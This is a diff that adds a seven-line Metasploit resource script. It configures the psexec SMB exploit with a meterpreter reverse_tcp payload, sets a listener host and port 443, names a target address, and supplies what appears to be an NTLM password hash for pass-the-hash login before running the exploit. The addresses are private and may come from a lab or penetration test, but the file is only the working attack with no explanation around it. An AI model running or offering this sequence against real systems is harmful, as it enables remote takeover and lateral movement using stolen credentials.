@@ -1,0 +1,7 @@
+use exploit/windows/smb/psexec
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.245.156
+set lport 443
+set rhost 192.168.245.100
+set SMBPASS 3b2d4eac069:299F06259FD5B926F265C26D27B391A2
+exploit
